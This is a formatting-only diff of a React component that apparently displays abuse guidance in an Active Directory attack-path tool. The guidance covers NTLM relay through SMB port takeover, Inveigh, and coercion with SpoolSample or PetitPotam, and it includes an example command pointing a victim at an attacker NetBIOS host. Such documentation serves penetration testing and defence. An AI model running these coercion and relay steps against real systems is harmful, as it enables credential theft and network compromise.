@@ -22,31 +22,27 @@ const WindowsAbuse: FC<EdgeInfoProps> = ({ sourceName, sourceType }) => {
     return (
         <>
             <Typography variant='body2'>
-                1: Take Over the SMB Port on the Attacker Host
-
-                To avoid a conflict with SMB running on the attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved with smbtakeover.
+                1: Take Over the SMB Port on the Attacker Host To avoid a conflict with SMB running on the
+                attacker-controlled Windows computer, it is necessary to takeover the SMB port. This can be achieved
+                with smbtakeover.
             </Typography>
             <Typography variant='body2'>
-                2: Start the Relay Server
-
-                The NTLM relay can be executed with Inveigh.
+                2: Start the Relay Server The NTLM relay can be executed with Inveigh.
             </Typography>
             <Typography>
-                3: Coerce the Target Computer
-
-                Several coercion methods are documented here: <a href={"https://github.com/p0dalirius/windows-coerced-authentication-methods"}>Windows Coerced Authentication Methods</a>.
-
-                Examples of tools include:
-
-                <a href={"https://github.com/leechristensen/SpoolSample"}>SpoolSample</a>
-                <a href={"https://github.com/topotam/PetitPotam"}>PetitPotam</a>
-
-                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format:
-                \\SERVER_NETBIOS@PORT/PATH/TO/FILE.
-
-                Example: SpoolSample.exe "VICTIM_IP" "ATTACKER_NETBIOS@PORT/file.txt"
+                3: Coerce the Target Computer Several coercion methods are documented here:{' '}
+                <a href={'https://github.com/p0dalirius/windows-coerced-authentication-methods'}>
+                    Windows Coerced Authentication Methods
+                </a>
+                . Examples of tools include:
+                <a href={'https://github.com/leechristensen/SpoolSample'}>SpoolSample</a>
+                <a href={'https://github.com/topotam/PetitPotam'}>PetitPotam</a>
+                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
+                Connection String format: \\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe "VICTIM_IP"
+                "ATTACKER_NETBIOS@PORT/file.txt"
             </Typography>
-        </>)
+        </>
+    );
 };
 
 export default WindowsAbuse;
